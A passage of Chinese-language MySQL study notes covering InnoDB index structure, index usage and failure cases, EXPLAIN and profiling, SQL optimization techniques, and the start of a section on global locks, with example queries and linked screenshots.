② 由于查询返回的数据是 `*`，所以此时，还需要根据主键值`10`，到**聚集索引**中查找`10`对应的记录，最终找到`10`对应的行row。

③ 最终拿到这一行的数据，直接返回即可。

> **回表查询**： 这种先到二级索引中查找数据，找到主键值，然后再到聚集索引中根据主键值，获取数据的方式，就称之为回表查询。

```
InnoDB主键索引的B+tree高度为多高呢?

假设:
一行数据大小为1k，一页中可以存储16行这样的数据。InnoDB的指针占用6个字节的空间，主键即使为bigint，占用字节数为8。

高度为2：
	n * 8 + (n + 1) * 6 = 16*1024 , 算出n为 1170
	1171* 16 = 18736
也就是说，如果树的高度为2，则可以存储 18000 多条记录。

高度为3：
	1171 * 1171 * 16 = 21939856
也就是说，如果树的高度为3，则可以存储 2200w 左右的记录。
```

### 索引语法

创建索引

```mysql
CREATE [ UNIQUE | FULLTEXT ] INDEX index_name ON table_name (index_col_name,... );
```

查看索引

```mysql
SHOW INDEX FROM table_name; 
```

删除索引

```mysql
DROP INDEX index_name ON table_name; 
```

### SQL性能分析

#### SQL执行频率

MySQL客户端连接成功后，通过 `show [session|global] status` 命令可以提供服务器状态信息。

通过如下指令，可以查看当前数据库的`INSERT`、`UPDATE`、`DELETE`、`SELECT`的访问频次：

```mysql
-- session 是查看当前会话 ;
-- global 是查询全局数据 ;
SHOW GLOBAL STATUS LIKE 'Com_______';
```

![image-20220721103932087](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e71daab71791f26fa60cd71776269a59-18e334d.png)

> 通过上述指令，我们可以查看到当前数据库到底是以查询为主，还是以增删改为主，从而为数据库优化提供参考依据。 如果是以增删改为主，我们可以考虑不对其进行索引的优化。 如果是以查询为主，那么就要考虑对数据库的索引进行优化了。

#### 慢查询日志

慢查询日志记录了所有执行时间超过指定参数(`long_query_time`，单位：秒，默认10秒)的所有SQL语句的日志。

查看系统变量` slow_query_log` 确认MySQL的慢查询日志默认是否开启

```mysql
SHOW VARIABLES LIKE 'slow_query_log';
```

![image-20220721104940058](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/843ceb85ecc5e56542ac0eeebc19aff1-a9764fa.png)

MySQL的慢查询日志默认没有开启，如果要开启慢查询日志，需要在MySQL的配置文件中配置信息：

```shell
$ sudo vi /etc/mysql/mysql.conf.d/mysqld.cnf
```

```properties
# 开启MySQL慢日志查询开关
slow_query_log = 1
# 设置慢日志的时间为2秒，SQL语句执行时间超过2秒，就会视为慢查询，记录慢查询日志
long_query_time = 2
# 配置慢日志文件位置
slow_query_log_file     = /var/log/mysql/mysql-slow.log
```

```shell
$ sudo service mysql restart
```

![image-20220721105637784](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/cc736bfad5b24584ed0a7027c9968a20-53c9710.png)

#### profile详情

`show profiles` 能够在做SQL优化时帮助我们了解时间都耗费到哪里去了。通过`have_profiling`参数，能够看到当前MySQL是否支持profile操作：

```mysql
SHOW VARIABLES LIKE 'have_profiling';
```

![image-20220721105804761](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e0efd5ad52550a9f2476586d03ec182d-8ac9233.png)

- **开启配置**

  可以通过set语句在 session/global 级别开启profiling：

    ```mysql
  SET profiling = 1; 
    ```
  
  开关打开后，接下来所执行的SQL语句，都会被MySQL记录，并记录执行时间消耗到哪儿去了。

- **执行查询**

- **查看耗时**

  执行一系列的业务SQL的操作，然后通过如下指令查看指令的执行耗时：

  ```mysql
  -- 查看每一条SQL的耗时基本情况
  show profiles;
  
  -- 查看指定query_id的SQL语句各个阶段的耗时情况
  show profile for query query_id;
  
  -- 查看指定query_id的SQL语句CPU的使用情况
  show profile cpu for query query_id;
  ```

  示例:

  ```mysql
  show profiles;
  ```

  ![image-20220721110214454](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/3c9a547d8bcfe8ed081381b7efb9fb2a-4658f89.png)

  ```mysql
  show profile for query 17;
  ```

  ![image-20220721110307453](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/93b362398e894058aac314e5627f2a8b-8c4b42e.png)

#### explain

`EXPLAIN` 或者 `DESC` 命令可以获取 MySQL 如何执行 SELECT 语句的信息，包括在 SELECT 语句执行过程中表如何连接和连接的顺序。

```mysql
-- 直接在select语句之前加上关键字 explain / desc
EXPLAIN SELECT 字段列表 FROM 表名 WHERE 条件 ;
```

![image-20220721110551855](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5ff647c996af37ddd79f133c6fa32bd1-20d0da0.png)

Explain 执行计划中各个字段的含义:

| 字段 | 含义 |
| ---- | ---- |
|id|select查询的序列号，表示查询中执行select子句或者是操作表的顺序(id相同，执行顺序从上到下；id不同，值越大，越先执行)。|
|select_type|表示 SELECT 的类型，常见的取值有 SIMPLE（简单表，即不使用表连接或者子查询）、PRIMARY（主查询，即外层的查询）、UNION（UNION 中的第二个或者后面的查询语句）、SUBQUERY（SELECT/WHERE之后包含了子查询）等|
|type|表示连接类型，性能由好到差的连接类型为NULL、system、const、eq_ref、ref、range、 index、all 。|
|possible_key |显示可能应用在这张表上的索引，一个或多个。|
|key |实际使用的索引，如果为NULL，则没有使用索引。|
|key_len|表示索引中使用的字节数， 该值为索引字段最大可能长度，并非实际使用长度，在不损失精确性的前提下， 长度越短越好 。|
|rows|MySQL认为必须要执行查询的行数，在innodb引擎的表中，是一个估计值，可能并不总是准确的。|
|filtered |表示返回结果的行数占需读取行数的百分比， filtered 的值越大越好。|

### 索引使用

#### 最左前缀法则

如果索引了多列（**联合索引**），要遵守**最左前缀法则**。最左前缀法则指的是查询从索引的最左列开始，并且不跳过索引中的列。如果跳跃某一列，索引将会部分失效(后面的字段索引失效)。

**示例:** 

如在表`tb_user`中, 存在联合索引`idx_user_pro_age_sta` :

```mysql
SHOW INDEX FROM tb_user;
```

![image-20220721132803647](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5b43e1f5c940136aeb3c9e83c676d0fc-efb0116.png)

查询时，最左变的列，也就是profession必须存在，否则索引全部失效。而且中间不能跳过某一列，否则该列后面的字段索引将失效。

- **索引生效**

  - 所有字段均存在

    ```mysql
    explain select * from tb_user where profession = '软件工程' and age = 31 and status = '0';
    ```

    ![image-20220721133048017](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5991e9c66b721b6ec78639318dcf0e49-341906d.png)

  - 部分(前置)字段存在

    ```mysql
    explain select * from tb_user where profession = '软件工程' and age = 31; 
    ```

    ![image-20220721133152961](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5c7a849f5771511191ab0942a18cb951-7d61fe3.png)

  - 仅前置字段存在

    ```mysql
    explain select * from tb_user where profession = '软件工程';
    ```

    ![image-20220721133233056](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/9397934ba41710ed430f387cc834dcce-6a356b5.png)

  - 所有字段存在但乱序

    ```mysql
    explain select * from tb_user where age = 31 and status = '0' and profession = '软件工程';
    ```

    ![image-20220721133801011](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/2319b10404fe4145982738fc6e927993-267a03b.png)

- **索引失效**

  - 前置字段不存在

    ```mysql
    explain select * from tb_user where age = 31 and status = '0'; 
    ```

    ![image-20220721133342311](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/08165ab4b04921f25a02d4aae0d2b357-73afac7.png)

  - 仅后置字段存在

    ```mysql
    explain select * from tb_user where status = '0';
    ```

    ![image-20220721133501680](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/06a89f3d23229a1e34224bb0d9aa0f9d-0fa40c9.png)

- **索引部分生效**

  - 中间字段缺失

    ```mysql
    explain select * from tb_user where profession = '软件工程' and status = '0'; 
    ```

    ![image-20220721133632546](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/cbe057c3a4c89690cae1ff6dc6ae8a9c-742e612.png)

#### 范围查询

**联合索引**中，出现范围查询(`>`,`<`)，范围查询**右侧**的列索引失效。

**示例:** 

如在表`tb_user`中, 存在联合索引`idx_user_pro_age_sta` :

```mysql
SHOW INDEX FROM tb_user;
```

![image-20220721132803647](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5b43e1f5c940136aeb3c9e83c676d0fc-efb0116.png)

**示例:** 

```mysql
explain select * from tb_user where profession = '软件工程' and age > 30 and status = '0';
```

![image-20220721134127293](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e7128769a32d85f7d42f5ded7e8a8614-08f9fe2.png)

> 当范围查询使用`>` 或 `<` 时，走联合索引了，但是索引的长度为49，就说明范围查询右边的`status`字段是没有走索引的。

#### SQL提示

SQL提示，是优化数据库的一个重要手段，简单来说，就是在SQL语句中加入一些人为的提示来达到优化操作的目的。

1). `use index()` ： 建议MySQL使用哪一个索引完成此次查询（仅仅是建议，mysql内部还会再次进行评估）。

2). `ignore index()` ： 忽略指定的索引。

3). `force index() ` ： 强制使用索引。

**示例:** 

如在表`tb_user`中, 存在联合索引`idx_user_pro_age_sta` 和单列索引`idx_user_pro`:

```mysql
SHOW INDEX FROM tb_user;
```

![image-20220721160823707](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/922811f03894b6d5cdeadb1130f6e636-8043c96.png)

```mysql
explain select profession,status from tb_user where profession = '软件工程';
```

![image-20220721161314776](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/54b96c0da03cb90e0337e21c80f55e2c-4eb654a.png)

> 可能使用两个索引, 实际使用了联合索引

- 建议使用单列索引`idx_user_pro`

  ```mysql
  explain select profession,status from tb_user use index(idx_user_pro) where profession = '软件工程';
  ```

  ![image-20220721161515384](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/2e5d4136361b42eef3f03c8bd840f572-f67f7c4.png)

- 建议忽略联合索引`idx_user_pro_age_sta`

  ```mysql
  explain select profession,status from tb_user ignore index(idx_user_pro_age_sta) where profession = '软件工程';
  ```

  ![image-20220721161605443](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/4e5c31e7d17940e42c399d24ed101cbc-e1e1970.png)

- 强制使用单列索引`idx_user_pro`

  ```mysql
  explain select profession,status from tb_user force index(idx_user_pro) where profession = '软件工程';
  ```

  ![image-20220721161906966](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/1730dad035d8a60e9755c0921c412e49-2765098.png)

#### 覆盖索引

覆盖索引是指查询使用了索引，并且需要返回的列，在该索引中已经全部能够找到 。尽量使用覆盖索引，减少`select *`。

```mysql
explain select id, profession from tb_user where profession = '软件工程' and age =31 and status = '0' ;
explain select id,profession,age, status from tb_user where profession = '软件工程'and age = 31 and status = '0' ;

explain select id,profession,age, status, name from tb_user where profession = '软件工程' and age = 31 and status = '0' ;
explain select * from tb_user where profession = '软件工程' and age = 31 and status= '0';
```

![image-20220721162458786](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/673a38b4c91222ae2de0dee876ef69d4-970fb5f.png)

> 从上述的执行计划我们可以看到，这四条SQL语句的执行计划前面所有的指标都是一样的，看不出来差异。但是后面的`Extra`，前面两条SQL的结果为 `Using where; Using Index` ; 而后面两条SQL的结果为: `Using index condition` 。

| Extra | 含义 |
| ----- | ---- |
|Using where; Using Index|查找使用了索引，但是需要的数据都在索引列中能找到，所以不需要回表查询数据|
|Using index condition|查找使用了索引，但是需要回表查询数据|

```
在tb_user表中有一个联合索引 idx_user_pro_age_sta，该索引关联了三个字段profession、age、status，而这个索引也是一个二级索引，所以叶子节点下面挂的是这一行的主键id。 
所以当我们查询返回的数据在 id、profession、age、status 之中，则直接走二级索引直接返回数据。 
如果超出这个范围，就需要拿到主键id，再去扫描聚集索引，再获取额外的数据，这个过程就是回表。 
而我们如果一直使用select * 查询返回所有字段值，很容易就会造成回表查询（除非是根据主键查询，此时只会扫描聚集索引）。
```

- **覆盖索引查询**

  ![image-20220721163323961](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/fe5732feaf57e90bb8efcf7c4d18e3c2-8238fcf.png)

  > 根据id查询，直接走聚集索引查询，一次索引扫描，直接返回数据，性能高。

  ![image-20220721163425667](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/4f81ccf65d2044b51d594249e0e1e69c-4a2203c.png)

  > 虽然是根据name字段查询，查询二级索引，但是由于查询返回字段为 id，name，在name的二级索引中，这两个值都是可以直接获取到的，因为覆盖索引，所以不需要回表查询，性能高。

- **回表查询**

  ![image-20220721163334823](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5aa007c732fb83b9ab8f501d52cf9c4c-4aaa791.png)

  > 由于在name的二级索引中，不包含gender，所以，需要两次索引扫描，也就是需要回表查询，性能相对较差一点。

#### 前缀索引

当字段类型为字符串（varchar，text，longtext等）时，有时候需要索引很长的字符串，这会让索引变得很大，查询时，浪费大量的磁盘IO， 影响查询效率。

此时可以只将字符串的一部分**前缀**，建立**索引**，这样可以大大节约索引空间，从而提高索引效率。

```mysql
-- 语法
create index idx_xxxx on table_name(column(n)) ; 
```

**示例:**

为`tb_user`表的`email`字段，建立长度为`5`的前缀索引。

```mysql
create index idx_email_5 on tb_user(email(5)); 
```

![image-20220721163843961](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/51d59ad752719f431e466df77b710810-93b9e0d.png)

**前缀长度确认方式**:

可以根据索引的**选择性**来决定，而选择性是指**不重复的索引值（基数）和数据表的记录总数的比值**，索引选择性越高则查询效率越高， 唯一索引的选择性是1，这是最好的索引选择性，性能也是最好的。

```mysql
select count(distinct email) / count(*) from tb_user;
select count(distinct substring(email,1,5)) / count(*) from tb_user;
```

**前缀索引的查询流程**:

![image-20220721164037661](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/2814720ad13e0c6d510f594115f9709e-a18d822.png)

#### 单列索引与联合索引

- 单列索引：即一个索引只包含单个列。

- 联合索引：即一个索引包含了多个列。

> 在业务场景中，如果存在多个查询条件，考虑针对于查询字段建立索引时，建议建立联合索引，而非单列索引。

**联合索引结构示意图**:

![image-20220721164146041](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c9535c60f7693755f1a391a94e21b25f-74d573a.png)



#### 索引失效情况

##### **索引列运算** 

不要在索引列上进行运算操作， 索引将失效。

**示例:** 

如在表`tb_user`中, 存在联合索引`idx_user_phone` :

```mysql
SHOW INDEX FROM tb_user;
```

![image-20220721134332039](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/7f6ccc40c0f8f925768349f4fd324eb5-7b4f058.png)

- 当根据`phone`字段进行等值匹配查询时, 索引生效。

  ```mysql
  explain select * from tb_user where phone = '17799990015'; 
  ```

  ![image-20220721134440077](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/0ca381b6d5c63dc3b25ddd9eb05a7ff9-e4daa6b.png)

- 当根据`phone`字段进行函数运算操作之后，索引失效。

  ```mysql
  explain select * from tb_user where substring(phone,10,2) = '15';
  ```

  ![image-20220721134526343](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/412b3336d377b0c180d5c4719889a677-e49c05b.png)

##### **字段格式隐式转换** 

当字段参数发生隐式格式转换时, 索引失效, 如字符串类型字段使用时，不加引号。

**示例:** 

字段`phone`为字符串格式`varchar(11)`

![image-20220721134824566](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/39c3111cb34ac17c3b47e1b8972c0255-826a805.png)

- 参数带引号, 无格式转换, 索引生效

  ```mysql
  explain select * from tb_user where phone = '17799990015';
  ```

  ![image-20220721134941190](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/1d47e0314a6cfcee966efdbfcdf47453-d63b585.png)

- 参数不带引号, 发生隐式格式转换, 索引失效

  ```mysql
  explain select * from tb_user where phone = 17799990015;
  ```

  ![image-20220721135035956](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/08844d664b8d1fd4bfae15c40e445266-eaadd83.png)

> 如果字符串不加单引号，对于查询结果没什么影响，但是数据库存在隐式类型转换，索引将失效。

##### **模糊查询** 

如果仅仅是尾部模糊匹配，索引不会失效。如果是头部模糊匹配，索引失效。

- 尾部模糊匹配, 索引生效

  ```mysql
  explain select * from tb_user where profession like '软件%';
  ```

  ![image-20220721135455388](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/23bd1c6c306a9735484e04bdc64c91c8-0ab7119.png)

- 头部模糊匹配, 索引失效

  ```mysql
  explain select * from tb_user where profession like '%工程';
  ```

  ![image-20220721135541859](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b02cdb1e4ae5feecebeb525bbb7681f2-4976945.png)

- 首尾模糊匹配, 索引失效

  ```mysql
  explain select * from tb_user where profession like '%工%';
  ```

  ![image-20220721135614784](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b0e8c08b275123b0c3fce26b383a4978-5a9bb03.png)

##### **or连接条件** 

用or分割开的条件， 如果or前的条件中的列有索引，而后面的列中没有索引，那么涉及的索引都不会被用到。

**示例:** 

如在表`tb_user`中, 存在主键索引 `PRIMARY` :

```mysql
SHOW INDEX FROM tb_user;
```

![image-20220721135847472](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5a689b60e532d981a697fc3526c6f07c-7677cbd.png)

- 条件涉及的列存在无索引列, 索引失效

  ```mysql
  explain select * from tb_user where id = 10 or age = 23;
  ```

  ![image-20220721140012154](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/73f338c256b0763e780de2119a501ca3-13b652c.png)

- 涉及的列全部存在索引, 索引生效

  ```mysql
  -- 创建涉及字段索引
  create index idx_user_age on tb_user(age);
  show index from tb_user;
  ```

  ![image-20220721140219109](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/a00d9b3bed121a0e08d12e3d73730277-c0806c1.png)

  ```mysql
  explain select * from tb_user where id = 10 or age = 23;
  ```

  ![image-20220721140256554](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/1e040cc08d5ada788fce8bd0add3909b-6d32b24.png)

##### **数据分布影响** 

如果MySQL评估使用索引比全表更慢，则不使用索引。

**示例:** 

所有数据`profession`字段都有值不为`null`

- 查询所有`profession`字段为空的数据, 使用索引

    ```mysql
    explain select * from tb_user where profession is null;
    ```

    ![image-20220721155959975](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/bbe6ba567983815db5ca08b704a5a45a-c1ab9c7.png)

- 查询所有`profession`字段不为空的数据, 不使用索引, 全表扫描

  ```mysql
  explain select * from tb_user where profession is not null;
  ```

  ![image-20220721160141808](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/db6f2928d4747d7c25bb41193a0f318f-7b226e6.png)

### 索引设计原则

- 针对于数据量较大，且查询比较频繁的表建立索引。
- 针对于常作为查询 `条件（where）`、`排序（order by）`、`分组（group by）`操作的字段建立索引。
- 尽量选择**区分度高**的列作为索引，尽量建立唯一索引，区分度越高，使用索引的效率越高。
- 如果是**字符串**类型的字段，字段的长度较长，可以针对于字段的特点，建立**前缀索引**。
- 尽量使用**联合索引**，减少**单列索引**，查询时，联合索引很多时候可以覆盖索引，节省存储空间，避免回表，提高查询效率。
- 要控制索引的**数量**，索引并不是多多益善，索引越多，维护索引结构的代价也就越大，会影响增删改的效率。
- 如果索引列不能存储`NULL`值，请在创建表时使用`NOT NULL`约束它。当优化器知道每列是否包含`NULL`值时，它可以更好地确定哪个索引最有效地用于查询。

## SQL优化

### 批量insert优化

如果需要一次性往数据库表中插入多条记录，可以从以下三个方面进行优化:

- 批量插入数据

  ```mysql
  Insert into tb_test values(1,'Tom'),(2,'Cat'),(3,'Jerry'); 
  ```

- 手动控制事务

  ```mysql
  start transaction;
  insert into tb_test values(1,'Tom'),(2,'Cat'),(3,'Jerry');
  insert into tb_test values(4,'Tom'),(5,'Cat'),(6,'Jerry');
  insert into tb_test values(7,'Tom'),(8,'Cat'),(9,'Jerry');
  commit;
  ```

- 主键顺序插入

  主键顺序插入性能高于乱序插入

  ```
  主键乱序插入 : 8 1 9 21 88 2 4 15 89 5 7 3
  主键顺序插入 : 1 2 3 4 5 7 8 9 15 21 88 89
  ```

**大批量插入数据**

如果一次性需要插入大批量数据(比如: 几百万的记录)，使用`insert`语句插入性能较低，此时可以使用MySQL数据库提供的`load`指令进行插入。操作如下：

![image-20220722155109029](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f1df6f8d1924e0bcb44a1bcf06f35bda-628de53.png)

```mysql
-- 客户端连接服务端时，加上参数 -–local-infile
mysql –-local-infile -u root -p

-- 设置全局参数local_infile为1，开启从本地加载文件导入数据的开关
set global local_infile = 1;

-- 执行load指令将准备好的数据，加载到表结构中
load data local infile '/path/of/file/bigrecord.txt' into table tb_user fields terminated by ',' lines terminated by '\n' ;
```

### 主键优化

#### 数据组织方式

在**InnoDB**存储引擎中，表数据都是根据主键顺序组织存放的，这种存储方式的表称为**索引组织表**(`index organized table` `IOT`)。

![image-20220722155346362](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/70cb8c9731267f7a96ee099dc20ac4b4-47c9f6c.png)

行数据，都是存储在聚集索引的叶子节点上的。nnoDB的逻辑结构图如下：

![image-20220722155410563](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/9db61c29c9f209b925b0701b14a90774-8848286.png)

在InnoDB引擎中，数据行是记录在逻辑结构 page 页中的，而每一个页的大小是固定的，默认16K。

那也就意味着一个页中所存储的行也是有限的，如果插入的数据行row在该页存储不下，将会存储到下一个页中，页与页之间会通过指针连接。

#### 页分裂

页可以为空，也可以填充一半，也可以填充100%。每个页包含了2-N行数据(如果一行数据过大，会行溢出)，根据主键排列。

- **主键顺序插入效果**

  ①. 从磁盘中申请页空间， 主键顺序插入

  ![image-20220722155558778](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/84f4249dc43d473c891da383a2643445-50a433f.png)

  ②. 第一个页没有满，继续往第一页插入

  ![image-20220722155613822](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/eb4530353125130e9804d8e83f7d40fe-d084981.png)

  ③. 当第一个页写满之后，再写入第二个页，页与页之间会通过指针连接

  ![image-20220722155633307](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/5eb57f71c8303d589762d5f0e538521e-b872536.png)

  ④. 当第二页写满了，再往第三页写入

  ![image-20220722155648842](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/4cf5f0821c3462e0d110002546ba2195-acb0438.png)

- **主键乱序插入效果**

  ①. 现在`1#`,`2#`页都已经写满了，存放了如图所示的数据

  ![image-20220722155722396](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f8601908fb23b8783a411351e6a86c61-18acda3.png)

  ②. 此时再插入id为50的记录

  索引结构的叶子节点是有顺序的。按照顺序，应该存储在47之后。但是47所在的`1#`页，已经写满了，存储不了50对应的数据了。 那么此时会开辟一个新的页 `3#`。

  ![image-20220722155827798](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/6ca4dcede4697ff6d6f27c6eb551fe17-a766ffa.png)

  但是并不会直接将50存入`3#`页，而是会将`1#`页后一半的数据，移动到`3#`页，然后在`3#`页，插入50。

  ![image-20220722155920478](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f7719969b2dbf36cf79d1a049090524d-249e7c5.png)

  ![image-20220722155924764](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/9945f8e1da4aafd9da7727c3d878f71f-9a3759f.png)

  移动数据，并插入id为50的数据之后，那么此时，这三个页之间的数据顺序是有问题的。 `1#`的下一个页，应该是`3#`， `3#`的下一个页是`2#`。 所以，此时，需要重新设置链表指针。

  ![image-20220722155956105](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/bf268a28510a4c10b50ac76733ef5b24-271ed6c.png)

  上述的这种现象，称之为 **页分裂**，是比较耗费性能的操作。

#### 页合并

目前表中已有数据的索引结构(叶子节点)如下：

![image-20220722160047317](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/88da958e1280a10aba08c5238a9b2d8a-ba63f06.png)

当我们对已有数据进行删除时，具体的效果如下:

①当删除一行记录时，实际上记录并没有被物理删除，只是记录被标记（flaged）为删除并且它的空间变得允许被其他记录声明使用。

![image-20220722160112220](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/fe92c40488029f733cca6d50a978843c-fbd6a4d.png)

②当我们继续删除2#的数据记录。当页中删除的记录达到 `MERGE_THRESHOLD`（默认为页的50%），InnoDB会开始寻找最靠近的页（前或后）看看是否可以将两个页合并以优化空间使用。

![image-20220722160155705](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/a705fde6786666c8380ac668dd44fbfd-258b17c.png)

![image-20220722160207264](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/4ed1995a5eda5dc878b37878e064e187-774229d.png)

![image-20220722160214662](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/cc885c72259f3d6ea19831f7f0210de3-b62ba76.png)

这里面所发生的合并页的这个现象，就称之为 **页合并**。

> MERGE_THRESHOLD：合并页的阈值，可以自己设置，在创建表或者创建索引时指定。

#### 主键索引设计原则

- 满足业务需求的情况下，尽量**降低主键的长度**。
- 插入数据时，尽量选择顺序插入，选择使用`AUTO_INCREMENT`自增主键。

- 尽量不要使用UUID做主键或者是其他自然主键，如身份证号。
- 业务操作时，避免对主键的修改。

### order by优化

MySQL的排序，有两种方式：

- `Using filesort` : 通过表的索引或全表扫描，读取满足条件的数据行，然后在排序缓冲区`sort buffer`中完成排序操作，所有**不是通过索引直接返回排序结果的排序**都叫 FileSort 排序。
- `Using index` : **通过有序索引顺序扫描直接返回有序数据**，这种情况即为 `using index`，不需要额外排序，操作效率高。

对于以上的两种排序方式，`Using index`的性能**高**，而`Using filesort`的性能**低**，我们在优化排序操作时，尽量要优化为 `Using index`。

**order by优化原则**:

- 根据排序字段建立合适的索引，多字段排序时，也遵循最左前缀法则。
- 尽量使用覆盖索引。
- 多字段排序, 一个升序一个降序，此时需要注意联合索引在创建时的规则（`ASC/DESC`）。
- 如果不可避免的出现filesort，大数据量排序时，可以适当增大排序缓冲区大小`sort_buffer_size`(默认256k)。

### group by优化

在分组操作中，我们需要通过以下两点进行优化，以提升性能：

- 在分组操作时，可以通过索引来提高效率。
- 分组操作时，索引的使用也是满足最左前缀法则的。

### limit优化

在数据量比较大时，如果进行limit分页查询，在查询时，越往后，分页查询效率越低。

```mysql
select * from tb_sku limit 2000000,10;
```

当在进行分页查询时，如果执行 `limit 2000000,10 `，此时需要MySQL排序前2000010 条记录，仅仅返回 2000000 - 2000010 的记录，其他记录丢弃，查询排序的代价非常大 。

**优化思路**: 

一般分页查询时，通过创建 **覆盖索引** 能够比较好地提高性能，可以通过**覆盖索引**加**子查询**形式进行优化。

```mysql
explain select * from tb_sku t , (select id from tb_sku order by id limit 2000000,10) a where t.id = a.id;
```

### count优化

`count()`是一个聚合函数，对于返回的结果集，一行行地判断，如果 count 函数的参数不是NULL，累计值就加 1，否则不加，最后返回累计值。

用法：count（*）、count（主键）、count（字段）、count（数字）

| count用法 | 含义 |
| --------- | ---- |
|count(主键)|InnoDB 引擎会遍历整张表，把每一行的 主键id 值都取出来，返回给服务层。服务层拿到主键后，直接按行进行累加(主键不可能为null)|
|count(字段)|没有`not null` 约束 : InnoDB 引擎会遍历整张表把每一行的字段值都取出来，返回给服务层，服务层判断是否为null，不为null，计数累加。<br />有`not null`约束：InnoDB 引擎会遍历整张表把每一行的字段值都取出来，返回给服务层，直接按行进行累加。|
|count(数字)|InnoDB 引擎遍历整张表，但不取值。服务层对于返回的每一行，放一个数字“1”进去，直接按行进行累加。|
|count(*)|InnoDB引擎并不会把全部字段取出来，而是专门做了优化，不取值，服务层直接按行进行累加。|

> 按照效率排序，`count(字段) `<  `count(主键 id)` < `count(1)` ≈ `count(*)`，所以尽量使用 `count(*)`。

### update优化

注意一下update语句执行时的注意事项。

```mysql
update course set name = 'Tom' where id = 1 ;
```

当我们在执行上述的SQL语句时，会锁定id为1这一行的数据，然后事务提交之后，**行锁**释放。



但是当我们在执行如下SQL时:

```mysql
update course set name = 'Tom' where name = 'Jerry' ; 
```

当我们开启多个事务，在执行上述的SQL时，我们发现行锁升级为了**表锁**。 导致该update语句的性能大大降低。

> InnoDB的行锁是针对索引加的锁，不是针对记录加的锁 ,并且该索引不能失效，否则会从行锁升级为表锁 。

## 锁

锁是计算机协调多个进程或线程并发访问某一资源的机制。

在数据库中，除传统的计算资源（CPU、RAM、I/O）的争用以外，数据也是一种供许多用户共享的资源。如何保证数据并发访问的一致性、有效性是所有数据库必须解决的一个问题，锁冲突也是影响数据库并发访问性能的一个重要因素。从这个角度来说，锁对数据库而言显得尤其重要，也更加复杂。

MySQL中的锁，按照锁的粒度分，分为以下三类：

- 全局锁：锁定数据库中的所有表。
- 表级锁：每次操作锁住整张表。
- 行级锁：每次操作锁住对应的行数据。

### 全局锁

全局锁就是对整个数据库实例加锁，加锁后整个实例就处于**只读**状态，后续的DML的写语句，DDL语句，已经更新操作的事务提交语句都将被**阻塞**。

典型的使用场景是做**全库的逻辑备份**，对所有的表进行锁定，从而获取一致性视图，保证数据的完整性。

![image-20220723162259552](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/54190529e26ebf76139ee6f4306118c3-0e43073.png)

对数据库进行进行逻辑备份之前，先对整个数据库加上全局锁，一旦加了全局锁之后，其他的DDL、DML全部都处于阻塞状态，但是可以执行DQL语句，也就是处于只读状态，而数据备份就是查询操作。那么数据在进行逻辑备份的过程中，数据库中的数据就是不会发生变化的，这样就保证了数据的一致性和完整性。

```mysql
-- 语法
-- 1). 加全局锁
flush tables with read lock ; 

-- 2). 数据备份
